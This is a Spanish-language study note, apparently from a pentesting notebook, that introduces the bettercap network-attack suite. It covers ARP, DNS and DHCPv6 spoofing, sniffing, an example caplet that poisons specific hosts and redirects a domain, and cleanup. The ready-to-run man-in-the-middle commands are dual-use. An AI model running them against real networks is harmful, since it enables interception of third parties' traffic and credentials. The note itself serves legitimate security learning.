---
tags:
  - MITM
  - Redes
  - Tipo/Introduccion
Descripción: "La navaja suiza de la interposición en red: módulos de spoofing ARP, DNS y DHCPv6, sniffing y proxies, con caplets para automatizar"
Fecha de actualización: 2026-08-03
Nota previa: 
Nota siguiente: 
Area: "[[bettercap.base|bettercap]]"
---
---

`bettercap` es una suite modular de ataques de red escrita en Go. Sustituye funcionalmente a `ettercap` —que **sigue vivo**, con release en abril de 2026, pero con peor ergonomía— y añade módulos que aquél no tiene: proxies HTTP/HTTPS integrados, spoofing de DHCPv6, Wi-Fi, BLE y CAN bus.

Versión verificada: **v2.41.7** (11 de mayo de 2026).

## El modelo: sesión interactiva y módulos

Se arranca una sesión y se activan módulos por nombre. Nada corre hasta que lo enciendes.

```shell-session
$ sudo bettercap -iface eth0
» help                       # módulos disponibles y su estado
» net.probe on               # descubrir hosts activos
» net.show                   # tabla de hosts
» help arp.spoof             # parámetros de un módulo concreto
```

| Módulo | Para qué |
| - | - |
| `net.probe` / `net.recon` | Descubrimiento de hosts |
| **`arp.spoof`** | Envenenamiento ARP ([[01 - ARP poisoning]]) |
| **`dns.spoof`** | Respuestas DNS falsificadas ([[04 - DNS spoofing y redirección de nombres]]) |
| **`dhcp6.spoof`** | DHCPv6 y RA — el vector IPv6 ([[03 - IPv6 - RA spoofing y DHCPv6 con mitm6]]) |
| `net.sniff` | Captura con parsers por protocolo y extracción de credenciales |
| `http.proxy` / `https.proxy` | Proxy transparente con scripts propios |
| `wifi.recon` | 802.11 ([[Wi-Fi Pentesting.base\|Wi-Fi]]) |
| `ticker` | Ejecutar comandos periódicamente |

## Flujo típico

```shell-session
$ sudo bettercap -iface eth0
» net.probe on
» net.show

» set arp.spoof.targets 192.168.1.5,192.168.1.7   # hosts CONCRETOS, no la subred
» set arp.spoof.fullduplex true                    # envenena también al gateway
» arp.spoof on

» set net.sniff.local true
» net.sniff on
```

> [!warning]+ No pongas `arp.spoof.targets` a toda la subred
> Por defecto, si no fijas objetivos, bettercap envenena **todo el segmento**. Eso te convierte en cuello de botella de la red entera, multiplica el riesgo de interrumpir sistemas de terceros y dispara cualquier detección. Apunta siempre a hosts concretos ([[05 - Detección y evasión del MITM de capa 2]]).
>
> Y acuérdate del reenvío: bettercap **lo activa solo** al encender `arp.spoof`, pero conviene verificarlo (`sysctl net.ipv4.ip_forward`). Sin él, el MITM es una denegación de servicio.

## Caplets: automatizar

Un *caplet* es un fichero de texto con comandos de la sesión, uno por línea. Es la forma de convertir un ataque en algo repetible y documentable.

```text
# mitm-objetivo.cap
set arp.spoof.targets 192.168.1.5
set arp.spoof.fullduplex true
set dns.spoof.domains api.objetivo.com
set dns.spoof.address 192.168.1.50
set net.sniff.output captura.pcap

arp.spoof on
dns.spoof on
net.sniff on
```

```shell-session
$ sudo bettercap -iface eth0 -caplet mitm-objetivo.cap
$ sudo bettercap -iface eth0 -eval "net.probe on; net.show; q"   # una sola tanda
```

Los caplets aceptan también JavaScript para lógica más compleja (módulo `http.proxy` con `--proxy-script`).

## Frente a Ettercap

| | bettercap | Ettercap |
| - | - | - |
| Estado | v2.41.7 (may-2026) | **v0.8.4.1 (abr-2026), también vivo** |
| Interfaz | Sesión interactiva + caplets + API REST | GUI (GTK) y modo texto |
| IPv6 (DHCPv6/RA) | **Sí** | No |
| Proxies HTTP/HTTPS | Integrados | No |
| Filtros de tráfico | Scripts JS | Filtros compilados propios (`etterfilter`) |
| Wi-Fi / BLE / CAN | Sí | No |

<mark style="background: #FFB8EBA6;">Ettercap no está abandonado</mark>, en contra de lo que suele afirmarse: el flujo de GUI que describe *Attacking Network Protocols* sigue funcionando. bettercap gana en ergonomía, automatización y cobertura de IPv6, que es hoy el vector más rentable.

## Limpiar al terminar

Sal con `q` o `Ctrl+C` desde la sesión: bettercap reenvía las asociaciones ARP correctas al apagar `arp.spoof`. Matarlo con `kill -9` deja la red envenenada hasta que caduquen las cachés.

```shell-session
$ sudo sysctl -w net.ipv4.ip_forward=0
$ sudo nft flush ruleset          # si añadiste reglas de NAT a mano
```

> [!info]+ Fuentes
> - [bettercap — documentación de módulos](https://www.bettercap.org/modules/) y [caplets](https://www.bettercap.org/usage/caplets/).
> - Versiones verificadas el 2026-08-03 contra `api.github.com/repos/{bettercap/bettercap,Ettercap/ettercap}/releases/latest`.
